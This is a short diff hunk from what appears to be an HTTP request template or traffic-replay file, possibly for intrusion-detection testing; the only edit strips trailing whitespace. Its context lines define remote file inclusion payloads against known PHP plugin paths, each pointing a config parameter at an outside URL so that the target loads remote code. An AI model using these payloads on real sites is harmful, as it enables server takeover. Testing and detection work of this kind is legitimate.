@@ -196,7 +196,7 @@ Proxy-Connection: keep-alive
 %var rfi=/plugins/spamx/BaseAdmin.class.php?_CONF[path]=http://www.luomoeillegno.com/extras/idxx.txt??
 %var rfi=/components/com_virtuemart/show_image_in_imgtag.php?mosConfig_absolute_path=http://www.luomoeillegno.com/extras/idxx.txt
 %var rfi=/plugins/spamx/BaseAdmin.class.php?_CONF[path]=http://www.luomoeillegno.com/extras/idxx.txt
-%request 
+%request
 GET $rfi HTTP/1.1
 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
 Referer: http://www.mummy.com/index.html
